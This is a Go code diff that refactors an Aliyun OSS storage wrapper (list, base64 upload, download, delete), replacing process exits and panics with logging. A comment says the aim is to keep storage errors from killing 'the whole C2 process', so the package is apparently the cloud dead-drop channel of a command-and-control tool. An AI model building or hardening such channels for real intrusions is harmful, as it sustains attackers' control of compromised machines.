@@ -2,12 +2,10 @@ package oss
 
 import (
 	"BackendTemplate/pkg/encrypt"
-	"fmt"
 	"github.com/aliyun/aliyun-oss-go-sdk/oss"
-	"io/ioutil"
-	"log"
-	"os"
+	"io"
 	"strings"
+	"BackendTemplate/pkg/utils/logx"
 )
 
 type Client struct {
@@ -52,27 +50,31 @@ func List(c *Client) []oss.ObjectProperties {
 
 	lsRes, err := c.Bucket.ListObjects(oss.MaxKeys(3), oss.Prefix(""))
 	if err != nil {
-		fmt.Println("Error:", err)
-		os.Exit(-1)
+		// 错误返回空列表，不让单次 OSS 故障杀死整个 C2 进程
+		logx.Println("Error:", err)
+		return nil
 	}
-	//fmt.Println(lsRes)
+	//logx.Println(lsRes)
 	return lsRes.Objects
 
 }
 func Send(c *Client, name string, content []byte) {
 	encodeData, err := encrypt.EncodeBase64(content)
+	if err != nil {
+		logx.Println("[-] 编码失败:", err)
+		return
+	}
 	// 1.通过字符串上传对象
 	f := strings.NewReader(string(encodeData))
-	// var err error
 	err = c.Bucket.PutObject(name, f)
 	if err != nil {
-		log.Println("[-]", "上传失败")
+		logx.Println("[-]", "上传失败:", err)
 		return
 	}
 
 }
 func Get(c *Client, name string) []byte {
-	//fmt.Println(name)
+	//logx.Println(name)
 	body, err := c.Bucket.GetObject(name)
 	if err != nil {
 		return nil
@@ -80,20 +82,25 @@ func Get(c *Client, name string) []byte {
 	// 数据读取完成后，获取的流必须关闭，否则会造成连接泄漏，导致请求无连接可用，程序无法正常工作。
 	defer body.Close()
 	// println(body)
-	data, err := ioutil.ReadAll(body)
+	data, err := io.ReadAll(body)
 	if err != nil {
-		fmt.Println("Error:", err)
-		os.Exit(-1)
+		logx.Println("Error:", err)
+		return nil
 	}
-	//fmt.Println(string(data))
+	//logx.Println(string(data))
 	decodeData, err := encrypt.DecodeBase64(data)
+	if err != nil {
+		logx.Println("Error:", err)
+		return nil
+	}
 	return decodeData
 }
 
 func Del(c *Client, name string) {
 	err := c.Bucket.DeleteObject(name)
 	if err != nil {
-		panic(err)
+		// 删除失败仅记录日志，不 panic
+		logx.Println("[-] 删除失败:", name, err)
 	}
 
 }
